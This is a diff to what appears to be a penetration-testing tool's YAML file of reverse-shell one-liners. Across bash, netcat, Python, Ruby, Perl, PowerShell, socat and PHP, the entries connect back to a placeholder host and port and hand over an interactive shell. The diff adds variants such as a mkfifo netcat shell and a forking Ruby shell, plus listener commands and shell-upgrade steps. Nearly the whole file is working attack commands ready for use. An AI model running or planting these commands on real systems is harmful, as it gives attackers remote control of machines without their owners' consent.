@@ -5,32 +5,31 @@
 # - msfvenom
 #
 # catch:
-# - rlwrap ncat -C -v -4 -l -p $PORT$ -k
+# - simple: nc -lnvp $PORT$
+# - improved: rlwrap ncat -C -v -4 -l -p $PORT$ -k
 # - upgrade with: Ctrl-Z, stty raw -echo, fg, reset, export SHELL=bash, export TERM=xterm-256color, stty rows <num> columns <cols>
 
 bash:
-  devtcp: bash -i >& /dev/tcp/$HOST$/$PORT$ 0>&1
+  tcp: bash -i >& /dev/tcp/$HOST$/$PORT$ 0>&1
 
 nc:
   e: nc -e "/bin/sh -i" $HOST$ $PORT$
+  no_e: rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $HOST$ $PORT$ > /tmp/f
 
 python:
-  # TODO
-  # config:
-  #   base64: exec('$BASE64_PAYLOAD$'.decode('base64'))
-
   subproc: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$HOST$",$PORT$));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   pty: python -c 'import socket, os, pty; s=socket.socket(); s.connect(("$HOST$", $PORT$)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn("/bin/sh")'
-  ssl: "python -c 'import socket, subprocess, os, ssl; so=socket.socket(socket.AF_INET,socket.SOCK_STREAM); so.connect((\"$HOST$\",$PORT$)); s=ssl.wrap_socket(so); QB=False; while not QB: data=s.recv(1024); if len(data)==0: QB = True; proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE); stdout_value=proc.stdout.read() + proc.stderr.read(); s.sendall(stdout_value)'"
 
 ruby:
   socket: ruby -rsocket -e'f=TCPSocket.open("$HOST$",$PORT$).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+  # does not rely on /bin/sh and forks into background
+  no_sh: ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$HOST$","$PORT$");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 
 perl:
   connect: perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($PORT$,inet_aton("$HOST$")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 powershell:
-  tcpclient: '$client = New-Object System.Net.Sockets.TCPClient("$HOST$",$PORT$);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+  tcp: '$client = New-Object System.Net.Sockets.TCPClient("$HOST$",$PORT$);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
 openssl:
   # catch with 'ncat --ssl'
@@ -38,7 +37,7 @@ openssl:
 
 socat:
   # listener: socat file:$TTY,raw,echo=0 tcp-listen:$PORT$
-  a: socat tcp-connect:$HOST$:$PORT$ exec:/bin/sh,pty,stderr,setsid,sigint,sane
+  tcp: socat tcp-connect:$HOST$:$PORT$ exec:/bin/sh,pty,stderr,setsid,sigint,sane
 
 php:
   fsock: php -r '$sock=fsockopen("$HOST$",$PORT$);exec("/bin/sh -i <&3 >&3 2>&3");'
